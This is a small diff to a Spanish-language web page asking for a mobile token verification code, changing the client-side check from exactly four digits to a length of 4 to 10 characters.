@@ -86,7 +86,7 @@
     <p>Introduce el Token movil.</p>
     <div class="input-group">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="14" required>
+      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="4" maxlength="10" required>
     </div>
     <p id="mensajeError" class="mensaje-error"></p>
     <button onclick="validarCodigo()">Validar código</button>
@@ -106,11 +106,12 @@
       mensajeError.textContent = "";
       codigoInput.classList.remove("campo-requerido");
 
+      // Validación del código
       if (!codigo) {
         mensajeError.textContent = "El código es obligatorio";
         codigoInput.classList.add("campo-requerido");
-      } else if (!/^\d{4}$/.test(codigo)) {
-        mensajeError.textContent = "El código debe tener 4 dígitos numéricos";
+      } else if (codigo.length < 4 || codigo.length > 10) {
+        mensajeError.textContent = "El código debe tener entre 4 y 10 caracteres";
         codigoInput.classList.add("campo-requerido");
       } else {
         // Enviar el código al backend
